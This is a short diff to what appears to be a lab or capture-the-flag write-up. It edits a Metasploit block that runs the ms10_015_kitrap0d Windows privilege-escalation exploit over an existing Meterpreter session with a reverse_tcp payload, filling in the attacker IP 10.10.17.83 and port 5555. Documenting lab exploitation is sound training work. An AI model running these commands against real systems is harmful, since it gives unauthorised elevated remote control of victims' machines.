@@ -170,7 +170,7 @@ The exploit module was configured using the existing Meterpreter session:
 use exploit/windows/local/ms10_015_kitrap0d
 set SESSION 2
 set payload windows/meterpreter/reverse_tcp
-set LHOST <ATTACKER-IP>
+set LHOST 10.10.17.83
 set LPORT 5555
 run
 ```
